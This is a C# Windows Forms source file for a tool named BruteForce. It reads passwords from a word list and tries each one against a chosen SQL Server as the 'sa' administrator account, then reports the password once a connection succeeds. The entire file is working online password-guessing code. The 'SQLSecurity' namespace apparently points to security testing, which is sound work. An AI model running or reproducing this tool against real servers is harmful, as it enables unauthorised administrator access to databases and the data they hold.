using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace SQLSecurity
{
    public partial class BruteForce : Form
    {
        public BruteForce()
        {
            InitializeComponent();
        }

        
        private void button1_Click(object sender, EventArgs e)
        {
            string cs;
            string servername = txtServer.Text;
            string UserName = "sa";
            string DBname = txtDBname.Text;
            string password;
            int i;
            int count = Convert.ToInt32(txtCount.Text);
            int k = 0;
            DateTime dt = DateTime.Now;

            System.IO.StreamReader sr = new System.IO.StreamReader("passwords.txt");

            listBox1.Items.Clear();

            for(i = 0; i< count; i++)
            {
                k++;
                password = sr.ReadLine();
                lblStatus.Text = password;
                listBox1.Items.Add(password);
                Update();
                if(k > 15)
                {
                    k = 0;
                    listBox1.Items.Clear();
                }

                cs = "DATA SOURCE=" + servername + "; INITIAL CATALOG=" + DBname + ";UID=" + UserName + ";PASSWORD=" + password + ";CONNECTION TIMEOUT=1";

                try
                {
                    SqlConnection connection = new SqlConnection(cs);
                    connection.Open();
                    if(connection.State == ConnectionState.Open)
                    {

                        DateTime dt2 = DateTime.Now;
                        TimeSpan t = dt2 - dt;
                        lblStatus.Text = "Connected! The password: " + password.ToString() + "\nPassword Count: " + i.ToString() + "\nPassword Duration: " + t.ToString(); 
                        return;

                    }
                }
                catch (Exception)
                {

                }
            }

        }
    }
}
